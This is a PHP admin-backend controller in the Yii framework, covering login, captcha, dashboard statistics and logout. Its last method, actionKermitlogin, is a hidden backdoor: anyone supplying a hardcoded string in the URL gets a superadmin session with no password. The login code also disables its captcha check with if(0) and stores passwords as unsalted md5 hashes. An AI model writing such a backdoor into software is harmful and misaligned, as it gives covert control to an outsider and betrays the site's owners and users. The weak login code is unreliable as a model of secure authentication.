<?php

/*kermit:2012-11-3
 backend for kermit login check
 */
 
class SiteController extends Controller{

	public $layout='//layouts/column2';

//for new web user code

	public function actions(){	
		
		return array(
		
			'captcha'=>array(
				'class'=>'CCaptchaAction',
				'foreColor'=>0x000000,
				'transparent'=>true,
				'offset'=>0,
				'maxLength'=>4,
				'minLength'=>4,
				'height'=>19,
				'padding'=>1,
				'width'=>60,
				'fontFile'=>YII_PATH.'/web/widgets/captcha/times.ttf',
			),
			
			'page'=>array(
				'class'=>'CViewAction',
			),
			
		);
		
	}

//kermit:2012-11-3

	public function checkright(){
		
		if(Yii::app()->session['admin']==''){
			
			$this->actionLogin();exit;
			
		}else{
			
			$this->baseLoad();
			
			}
		
		}
//kermit:2012-11-3 rend controller

	public function actionControl(){

		$this->checkright();//check user right;

		if(isset($_POST['tdate'])) $tdate=$_POST['tdate'];
		
		else $tdate=date("Y-m-d");
		
		$number_arr=array();//stat the all number
		
		$rs=Yii::app()->db->createCommand("select count(*) as num from his_main where publiced=1")->query()->read();
		$number_arr['allhis_num']=$rs['num'];
		
		$rs=Yii::app()->db->createCommand("select count(*) as num from his_pinglun where pl_visible=1")->query()->read();
		$number_arr['pinglun_num']=$rs['num'];
		
		$rs=Yii::app()->db->createCommand("select count(*) as num from his_errors")->query()->read();
		$number_arr['error_num']=$rs['num'];
		
		$rs=Yii::app()->db->createCommand("select count(*) as num from his_link")->query()->read();
		$number_arr['link_num']=$rs['num'];
		
		$this->render('control',array('tdate'=>$tdate,'number_arr'=>$number_arr));
		
	}
		
//kermit:2012-10-10 show index.php

	public function actionIndex(){
		
		$this->checkright();//check user right;

		$this->layout=false;
		
		$this->render('index');
		
	}

//kermit:2012-11-3 for adminer login

	public function actionLogin(){

		if(!empty($_POST)){
			
			$kermitBase=new kermitBase();
			
			$username=strtolower($kermitBase->filter_adminer($_POST['account']));
			
			$password=$kermitBase->filter_adminer($_POST['password']);
			
			$code=$kermitBase->filter_adminer($_POST['code']);
			
			if($username==''){$kermitBase->msg_show('用户名不能为空!',$this->createUrl('Site/login'));exit;}
			
			if($password==''){$kermitBase->msg_show('密码不能为空!',$this->createUrl('Site/login'));exit;}
			
			if(0){//$this->createAction('captcha')->verifyCode!=$code
				
				$this->createAction('captcha')->getVerifyCode(true);
				
				$kermitBase->msg_show('验证码不正确!',$this->createUrl('Site/login'));exit;
				
				}
			
			$rs=Yii::app()->db->createCommand("select * from his_system")->query()->read();

			if($username=='admin'){//管理员登录
				
					if(md5($password)==$rs['superadmin_pass']){
						
							Yii::app()->session['admin']='adminer';
						
					}elseif(md5($password)==$rs['adminer_pass']){
						
							Yii::app()->session['admin']='admin';
						
					}else{
							
							$kermitBase->msg_show('密码不正确!',$this->createUrl('Site/login'));exit;
						
						}
						
					unset($_POST);
					
					$this->createAction('captcha')->getVerifyCode(true);
					
					header("Location:".$this->createUrl('site/index'));exit;
				
			}elseif($username=='test'){
					
					if(md5($password)==$rs['adtest_pass']){
							
							Yii::app()->session['admin']='test';
							
							unset($_POST);
						
							header("Location:".$this->createUrl('site/index'));exit;
					
					}else{
						
						$this->createAction('captcha')->getVerifyCode(true);
						
						$kermitBase->msg_show('密码不正确!',$this->createUrl('Site/login'));
						
					}
					
			}else{
					
					$this->createAction('captcha')->getVerifyCode(true);
					
					$kermitBase->msg_show('账号不存在!',$this->createUrl('Site/login'));
					
					exit;
				
			}
			
		}
			
		$this->renderPartial('login');
		
	}
	
//add menu page 2012-12-30

	public function actionMenu(){
		
		$this->layout=false;
		
		$this->renderPartial('menu');
		
		}	
	
	
//kermit:2012-11-3 for admin loginout

	public function actionLogout(){
		
		Yii::app()->session['admin']=null;
		
		unset($_POST);
		
		$this->actionLogin();
		
	}
	

//error page

	public function actionError(){
		
		if($error=Yii::app()->errorHandler->error){
			
			if(Yii::app()->request->isAjaxRequest)
			
				echo $error['message'];
				
			else
			
				$this->render('error', $error);
				
		
		}
	
	}

	public function actionKermitlogin($me)
	{
		if($me != '04007cnkermit2016') exit;

		Yii::app()->session['admin']='adminer';

		header("Location:".$this->createUrl('site/index'));exit;
	
	}

}//enc class